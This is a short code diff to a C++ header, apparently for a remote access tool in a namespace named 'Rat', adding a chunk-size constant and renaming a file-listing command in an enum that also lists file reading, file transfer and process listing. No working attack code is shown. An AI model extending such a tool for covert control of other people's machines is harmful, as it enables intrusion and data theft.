@@ -9,6 +9,7 @@ namespace Rat
 {
     const uint16_t DEFAULT_PORT = 8080;
     const size_t MAX_BUFFER_SIZE = 64 * 1024;
+    const size_t CHUNK_SIZE = 8 * 1024;
     const size_t MAX_CLIENT = 1000;
     const std::string KEY_AES = "";
     const std::string LOG_DIR = "var/log/rat";
@@ -16,7 +17,7 @@ namespace Rat
 
     enum CommandType {
         UNKNOWN, //0;
-        LIST_FILES, //1;
+        LIST_FILES_FOLDERS, //1;
         READ_FILE, //2;
         TRANSFER_FILE, //3;
         LIST_PROCESSES, //4;
